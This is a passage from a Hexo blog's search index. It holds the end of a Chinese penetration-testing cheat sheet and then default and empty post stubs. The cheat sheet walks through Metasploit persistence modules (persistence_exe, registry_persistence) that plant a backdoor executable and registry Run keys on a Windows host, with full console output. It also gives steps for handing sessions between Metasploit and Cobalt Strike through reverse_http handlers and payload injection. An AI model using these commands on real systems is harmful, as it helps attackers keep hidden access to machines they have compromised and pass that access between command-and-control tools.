STARTUP   USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM, SERVICE)</code></pre><p>此模块将可执行文件上载到远程主机并进行创建持久性。<br>涉及到四个参数</p><ul><li>REXENAME是拷贝到目标系统中的名字</li><li>EXEPATH是将要上传的后门在本地的位置</li><li>SESSION是选择运行此模块的会话</li><li>STARTUP是启动类型，有USER、SYSTEM、SERVICE这三种取值，USER表示为将在用户登录时启动，SYSTEM表示将在系统启动时启动(需要权限)，SERVICE表示将创建一个启动服务项(需要权限)。</li></ul><p>尝试一下：</p><pre><code class="bash">meterpreter &gt; run post/windows/manage/persistence_exe REXENAME=backdoor.exe REXEPATH=/home/ubuntu/shell.exe STARTUP=USER[*] Running module against SAUCERMAN[*] Reading Payload from file /home/ubuntu/shell.exe[+] Persistent Script written to C:\Users\TideSec\AppData\Local\Temp\backdoor.exe[*] Executing script C:\Users\TideSec\AppData\Local\Temp\backdoor.exe[+] Agent executed with PID 3684[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\mEMZDQOxkkeebI[*] Cleanup Meterpreter RC File: /home/ubuntu/.msf4/logs/persistence/SAUCERMAN_20190612.1023/SAUCERMAN_20190612.1023.rc</code></pre><p>4.registry_persistence</p><p>完整路径为exploit&#x2F;windows&#x2F;local&#x2F;registry_persistence</p><p>和第一种方法类似，此模块将会安装一个payload到注册表的启动项中。</p><pre><code class="bash">meterpreter &gt; background[*] Backgrounding session 13...msf5 auxiliary(server/socks5) &gt; use exploit/windows/local/registry_persistencemsf5 exploit(windows/local/registry_persistence) &gt; show optionsModule options (exploit/windows/local/registry_persistence):   Name           Current Setting  Required  Description   ----           ---------------  --------  -----------   BLOB_REG_KEY                    no        The registry key to use for storing the payload blob. (Default: random)   BLOB_REG_NAME                   no        The name to use for storing the payload blob. (Default: random)   CREATE_RC      true             no        Create a resource file for cleanup   RUN_NAME                        no        The name to use for the &#39;Run&#39; key. (Default: random)   SESSION                         yes       The session to run this module on.   SLEEP_TIME     0                no        Amount of time to sleep (in seconds) before executing payload. (Default: 0)   STARTUP        USER             yes       Startup type for the persistent payload. (Accepted: USER, SYSTEM)Exploit target:   Id  Name   --  ----   0   Automaticmsf5 exploit(windows/local/registry_persistence) &gt; set SESSION 13SESSION =&gt; 13msf5 exploit(windows/local/registry_persistence) &gt; run[*] Generating payload blob..[+] Generated payload, 6048 bytes[*] Root path is HKCU[*] Installing payload blob..[+] Created registry key HKCU\Software\0BaG3zDR[+] Installed payload blob to HKCU\Software\0BaG3zDR\iiEB4InD[*] Installing run key[+] Installed run key HKCU\Software\Microsoft\Windows\CurrentVersion\Run\SMPqA5kB[*] Clean up Meterpreter RC file: /home/ubuntu/.msf4/logs/persistence/192.168.81.154_20190612.2138/192.168.81.154_20190612.2138.rc</code></pre><p>同类型的还有其他payload，如exploit&#x2F;windows&#x2F;local&#x2F;vss_persistence，exploit&#x2F;windows&#x2F;local&#x2F;s4u_persistence。</p><h1 id="cs大全"><a href="#cs大全" class="headerlink" title="cs大全"></a>cs大全</h1><p>cs派生msf</p><pre><code class="bash">msf &gt; use exploit/multi/handler msf exploit(handler) &gt; set payload windows/meterpreter/reverse_httpmsf exploit(handler) &gt; set lhost 192.168.0.143msf exploit(handler) &gt; set lport 4444msf exploit(handler) &gt; exploitcs创建一个windows/foreign/reverse_http的 Listener然后选中对应机器，右键-&gt;Spawn，选择刚刚创建的监听器。</code></pre><p>msf 派生 cs</p><pre><code class="bash">use exploit/windows/local/payload_inject 使用该模块可以将 Metasploit 获取到的会话注入到CS中set DisablePayloadHandler true 用来禁用 Metasploit payload handler的监听 因为要监听到cs上set lhost xxx CSIPset lport 7869 CS上的listen端口set session 10 要转发的session</code></pre>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> cheatsheet </tag>
            
            <tag> 常用命令 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2024/09/29/hello-world/"/>
      <url>/2024/09/29/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre><code class="bash">$ hexo new &quot;My New Post&quot;</code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre><code class="bash">$ hexo server</code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre><code class="bash">$ hexo generate</code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre><code class="bash">$ hexo deploy</code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>tools</title>
      <link href="/2024/09/29/tools/"/>
      <url>/2024/09/29/tools/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 工具汇总 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>life</title>
      <link href="/2024/09/29/life/"/>
      <url>/2024/09/29/life/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 闲言碎语 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jsrpc+yakit</title>
      <link href="/2024/09/29/jsrpc-yakit/"/>
      <url>/2024/09/29/jsrpc-yakit/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试环境 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>zhanwei</title>
      <link href="/2024/09/29/zhanwei/"/>
      <url>/2024/09/29/zhanwei/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 测试环境 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
